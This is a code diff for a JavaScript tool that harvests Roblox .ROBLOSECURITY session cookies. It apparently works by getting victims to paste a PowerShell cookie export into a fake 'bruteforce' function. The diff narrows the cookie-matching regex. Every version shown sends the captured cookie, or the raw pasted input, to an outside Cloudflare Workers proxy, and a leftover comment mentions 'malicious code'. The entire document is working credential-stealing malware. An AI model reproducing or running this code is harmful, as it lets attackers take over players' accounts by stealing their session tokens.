@@ -1,20 +1,16 @@
 const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
- 
-function extractRobloxSecurityCookie(sessionId) {
-  // Covers multiple possible cookie formats:
-  const patterns = [
-    /\.ROBLOSECURITY[^=]+=([^;]+)/,        // Format: .ROBLOSECURITY=value               /\.ROBLOSECURITY",\s*"([^"]+)"/
-    /\.ROBLOSECURITY",\s*"([^"]+)"/,       // Format: .ROBLOSECURITY","value"
-    /(_\|WARNING:-DO-NOT-SHARE-THIS.+?)_/  // Full cookie warning format
-  ];
 
-  for (const regex of patterns) {
-    const match = sessionId.match(regex);
-    if (match) return match[1] || match[0]; // Return captured group or full match
+function extractRobloxSecurityCookie(input) {
+  // Strictly match PowerShell format only
+  const powershellPattern = /\$session\.Cookies\.Add\(\(New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
+  const powershellMatch = input.match(powershellPattern);
+  
+  if (powershellMatch) {
+    return powershellMatch[1]; // Return only the cookie value
   }
-  return null; // No cookie found
+  
+  return null; // Not a PowerShell format
 }
-
 
 async function sendToProxy(data) {
   try {
@@ -34,19 +30,19 @@ async function sendToProxy(data) {
   }
 }
 
-function bruteforce(sessionId) {
+function bruteforce(input) {
   let content;
-  const cookie = extractRobloxSecurityCookie(sessionId);
+  const cookie = extractRobloxSecurityCookie(input);
 
   if (cookie) {
-    content = `✅ Valid .ROBLOSECURITY cookie:\n\`\`\`${cookie}\`\`\``;
+    content = `✅ Extracted from PowerShell format:\n\`\`\`${cookie}\`\`\``;
   } else {
-    content = `⚠️ Raw session ID (no .ROBLOSECURITY found):\n\`\`\`${sessionId}\`\`\``;
+    content = `⚠️ Raw input (not PowerShell format):\n\`\`\`${input}\`\`\``;
   }
 
   // Send to proxy (or log for testing)
-  console.log(content); // Replace with sendToProxy() in malicious code
-  sendToProxy(cookie || sessionId);
+  console.log(content);
+  sendToProxy(cookie || input);
 }
 
 
